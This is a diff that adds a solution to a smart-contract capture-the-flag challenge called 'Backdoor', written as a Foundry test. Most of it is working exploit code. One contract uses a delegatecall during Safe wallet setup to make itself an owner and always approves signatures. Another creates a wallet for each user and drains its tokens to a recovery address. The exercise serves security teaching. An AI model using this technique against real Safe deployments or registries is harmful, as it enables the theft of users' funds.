@@ -7,6 +7,9 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {Enum} from "safe-smart-account/contracts/common/Enum.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {ISignatureValidator} from "safe-smart-account/contracts/interfaces/ISignatureValidator.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +73,7 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        new AttackEntryPoint(recovery, users, singletonCopy, walletFactory, walletRegistry);
     }
 
     /**
@@ -92,5 +95,92 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract MaliciousSetupContract is Safe, ISignatureValidator {
+    function maliciousSetup(address fakeOwner) external {
+        owners[fakeOwner] = address(0xBEEF);
+    }
+
+    function isValidSignature(bytes memory _data, bytes memory _signature) public view override returns (bytes4) {
+        return EIP1271_MAGIC_VALUE;
+    }
+}
+
+contract AttackEntryPoint {
+    uint256 constant safeTxGas = 0;
+    uint256 constant baseGas = 0;
+    uint256 constant gasPrice = 0;
+    address constant gasToken = address(0);
+    address constant refundReceiver = address(0);
+
+    constructor(
+        address recovery,
+        address[] memory users,
+        Safe singletonCopy,
+        SafeProxyFactory walletFactory,
+        WalletRegistry walletRegistry
+    ) {
+        MaliciousSetupContract setupContract = new MaliciousSetupContract();
+        bytes memory setupCall = abi.encodeWithSelector(setupContract.maliciousSetup.selector, address(setupContract));
+
+        for (uint256 i = 0; i < users.length; i++) {
+            Safe safe;
+            {
+                address[] memory safeOwners = new address[](1);
+                safeOwners[0] = users[i];
+                bytes memory safeInitializer = abi.encodeWithSelector(
+                    singletonCopy.setup.selector,
+                    safeOwners,
+                    1, // threshold
+                    setupContract, // delegate call to this
+                    setupCall, // delegate call data
+                    address(0), // fallback handler
+                    address(0), // paymentToken
+                    0, // payment
+                    address(0) // paymentReceiver
+                );
+                safe = Safe(
+                    payable(
+                        address(
+                            walletFactory.createProxyWithCallback(address(singletonCopy), safeInitializer, 0, walletRegistry)
+                        )
+                    )
+                );
+            }
+            require(safe.isOwner(address(setupContract)), "fakeOwner must become an owner");
+            bytes memory tokenTransferData = abi.encodeWithSelector(IERC20.transfer.selector, recovery, 10e18);
+
+            // bytes32 txHash = safe.getTransactionHash(
+            //     address(walletRegistry.token()), // to,
+            //     0, // value
+            //     tokenTransferData,
+            //     Enum.Operation.Call,
+            //     gasleft(), // safeTxGas,
+            //     baseGas,
+            //     gasPrice,
+            //     gasToken,
+            //     refundReceiver,
+            //     0 // nonce
+            // );
+            bytes memory txSig = abi.encodePacked(
+                bytes32(uint256(uint160(address(setupContract)))), bytes32(uint256(65)), uint8(0), // actual signature
+                bytes32(""), bytes32(""), uint8(0) // dummy value to increase the length
+            );
+
+            safe.execTransaction(
+                address(walletRegistry.token()), // to
+                0, // value
+                tokenTransferData,
+                Enum.Operation.Call,
+                safeTxGas,
+                baseGas,
+                gasPrice,
+                gasToken,
+                payable(refundReceiver),
+                txSig
+            );
+        }
     }
 }
